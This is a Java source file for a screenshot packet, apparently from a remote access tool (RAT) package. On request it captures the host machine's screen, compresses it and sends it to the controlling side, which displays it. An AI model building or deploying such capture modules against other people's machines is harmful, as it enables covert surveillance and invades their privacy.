package de.sogomn.rat.packet;

import java.awt.image.BufferedImage;

import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.FrameEncoder;
import de.sogomn.rat.util.QuickLZ;

public final class ScreenshotPacket extends AbstractPingPongPacket {
	
	private BufferedImage image;
	
	private static final BufferedImage NO_IMAGE = new BufferedImage(10, 10, BufferedImage.TYPE_INT_RGB);
	private static final int SCREEN_WIDTH = 800;
	private static final int SCREEN_HEIGHT = 600;
	
	public ScreenshotPacket() {
		type = REQUEST;
		image = NO_IMAGE;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		byte[] data = ImageUtils.toByteArray(image, "PNG");
		data = QuickLZ.compress(data);
		
		connection.writeInt(data.length);
		connection.write(data);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final int length = connection.readInt();
		byte[] data = new byte[length];
		connection.read(data);
		data = QuickLZ.decompress(data);
		
		image = ImageUtils.toImage(data);
		
		if (image == null) {
			image = NO_IMAGE;
		}
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		image = FrameEncoder.takeScreenshot();
		
		if (image == null) {
			image = NO_IMAGE;
		}
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		final Screen screen = new Screen(width, height);
		
		screen.addListener(g -> {
			g.drawImage(image, 0, 0, null);
		});
		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
		screen.show();
		screen.redraw();
	}
	
	public BufferedImage getImage() {
		return image;
	}
	
}
